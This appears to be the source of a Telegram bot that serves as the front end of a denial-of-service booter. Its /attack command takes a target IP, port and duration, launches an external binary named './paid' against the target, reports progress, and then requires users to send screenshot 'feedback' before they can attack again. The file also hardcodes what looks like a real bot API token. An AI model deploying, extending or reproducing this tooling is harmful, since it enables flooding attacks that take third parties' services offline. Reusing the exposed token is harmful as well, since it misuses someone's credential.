import telebot
import subprocess
import threading
import time
from telebot import types

API_TOKEN = '8047907032:AAE6OD1cNxQjc1JpeBjfOW4V1Fxu_TGCYT4'
bot = telebot.TeleBot(API_TOKEN)

ALLOWED_GROUP_ID = -1002204038475  # Designated group for attack commands
MAX_ATTACK_TIME = 180              # Maximum attack duration (seconds)

user_states = {}     # Track user state: None or 'waiting_for_feedback'
running_attacks = {} # Track running attacks for cancellation

def format_progress_bar(elapsed, attack_time, bar_length=20):
    ratio = min(max(elapsed / attack_time, 0), 1)
    filled_length = int(round(bar_length * ratio))
    bar = '█' * filled_length + '-' * (bar_length - filled_length)
    return f"[{bar}]"

def execute_venom(ip, port, attack_time, chat_id, user_id):
    command = ["./paid", ip, str(port), str(attack_time)]
    start_time = time.time()

    # Initial attack message with cancel button
    initial_text = (
        f"*Attack Started*\n"
        f"Target: {ip}\n"
        f"Port: {port}\n"
        f"Time: {attack_time} seconds\n\n"
        "Initializing..."
    )
    cancel_kb = types.InlineKeyboardMarkup()
    cancel_btn = types.InlineKeyboardButton(
        "Cancel Attack", callback_data=f"cancel_attack_{user_id}"
    )
    cancel_kb.add(cancel_btn)

    msg = bot.send_message(chat_id, initial_text, parse_mode='Markdown', reply_markup=cancel_kb)
    message_id = msg.message_id

    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    running_attacks[user_id] = {
        "process": process,
        "cancel": False,
        "start_time": start_time,
        "attack_time": attack_time,
        "message_id": message_id,
        "chat_id": chat_id
    }

    animation_frames = ["🚀", "🛰️", "✈️", "🚁"]
    frame_index = 0

    # Update progress until completion or cancellation
    while process.poll() is None:
        if running_attacks[user_id]["cancel"]:
            process.terminate()
            break

        elapsed = time.time() - start_time
        remaining = max(attack_time - elapsed, 0)
        progress_bar = format_progress_bar(elapsed, attack_time)
        anim = animation_frames[frame_index % len(animation_frames)]

        updated_text = (
            f"*Attack In Progress*\n"
            f"Target: {ip}\n"
            f"Port: {port}\n"
            f"Total Duration: {attack_time} seconds\n\n"
            f"Elapsed: {int(elapsed)}s, Remaining: {int(remaining)}s\n"
            f"{progress_bar} {anim}"
        )

        try:
            bot.edit_message_text(
                updated_text,
                chat_id=chat_id,
                message_id=message_id,
                parse_mode='Markdown',
                reply_markup=cancel_kb
            )
        except Exception as err:
            print("Error updating message:", err)

        time.sleep(0.5)
        frame_index += 1

    # Gather output and decide final message
    output, error = process.communicate()
    finished_normally = not running_attacks[user_id]["cancel"]

    if finished_normally:
        final_text = (
            f"*Attack Finished*\n"
            f"Target: {ip}\n"
            f"Port: {port}\n"
            f"Time: {attack_time} seconds\n\n"
            f"*Output:*\n`\n{output.strip()}\n```"
        )
        user_states[user_id] = 'waiting_for_feedback'
    else:
        final_text = (
            f"*Attack Cancelled*\n"
            f"Target: `{ip}`\n"
            f"Port: `{port}`\n"
            f"Time: `{attack_time}` seconds\n\n"
            "The attack was cancelled by the user."
        )
        user_states[user_id] = None

    try:
        bot.edit_message_text(
            final_text,
            chat_id=chat_id,
            message_id=message_id,
            parse_mode='Markdown'
        )
    except Exception as err:
        print("Error editing final message:", err)

    # Clean up
    running_attacks.pop(user_id, None)

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.send_message(
        message.chat.id,
        "👋 Welcome to the ┊★ȺŁØNɆ☂࿐ꔪ┊™ Dildos 💞 Bot!\nUse /attack <ip> <port> <time> to initiate an attack.",
        parse_mode='Markdown'
    )

@bot.message_handler(commands=['attack'])
def handle_attack(message):
    if message.chat.id != ALLOWED_GROUP_ID:
        bot.send_message(
            message.chat.id,
            "🚫 This bot can only be used in the designated group.",
            parse_mode='Markdown'
        )
        return

    user_id = message.from_user.id
    if user_states.get(user_id) == 'waiting_for_feedback':
        bot.send_message(
            message.chat.id,
            "⚠️ Please submit your file feedback before starting a new attack.",
            parse_mode='Markdown'
        )
        return

    parts = message.text.split()
    if len(parts) != 4:
        bot.send_message(
            message.chat.id,
            "⚠️ Usage: /attack <ip> <port> <time>",
            parse_mode='Markdown'
        )
        return

    ip = parts[1]
    try:
        port = int(parts[2])
        attack_time = int(parts[3])
    except ValueError:
        bot.send_message(
            message.chat.id,
            "⚠️ Please ensure that port and time are valid numbers.",
            parse_mode='Markdown'
        )
        return

    if attack_time > MAX_ATTACK_TIME:
        bot.send_message(
            message.chat.id,
            f"⚠️ The maximum allowed attack time is {MAX_ATTACK_TIME} seconds.",
            parse_mode='Markdown'
        )
        return

    threading.Thread(
        target=execute_venom,
        args=(ip, port, attack_time, message.chat.id, user_id),
        daemon=True
    ).start()

@bot.callback_query_handler(func=lambda call: call.data.startswith("cancel_attack_"))
def handle_cancel_attack(call):
    try:
        user_id = int(call.data.split("_")[-1])
    except ValueError:
        bot.answer_callback_query(call.id, "Invalid cancellation request.")
        return

    if user_id in running_attacks:
        running_attacks[user_id]["cancel"] = True
        bot.answer_callback_query(call.id, "Attack cancellation initiated.")
    else:
        bot.answer_callback_query(call.id, "No running attack found.")

# Accept *any* non-text message as valid feedback
@bot.message_handler(
    func=lambda message: user_states.get(message.from_user.id) == 'waiting_for_feedback',
    content_types=['text', 'photo', 'document', 'video', 'audio', 'voice', 'video_note']
)
def receive_feedback(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    if message.content_type == 'text':
        bot.send_message(
            chat_id,
            "🚫❌ Only file feedback is accepted! Please send a file (screenshot, document, video, etc.) of your results.",
            parse_mode='Markdown'
        )
        return

    # Accept any other content type as feedback
    bot.send_message(
        chat_id,
        "✅🎉 Feedback received! Thank you so much for your file! 👍🔥💯",
        parse_mode='Markdown'
    )
    user_states[user_id] = None

if __name__ == '__main__':
    bot.polling(none_stop=True)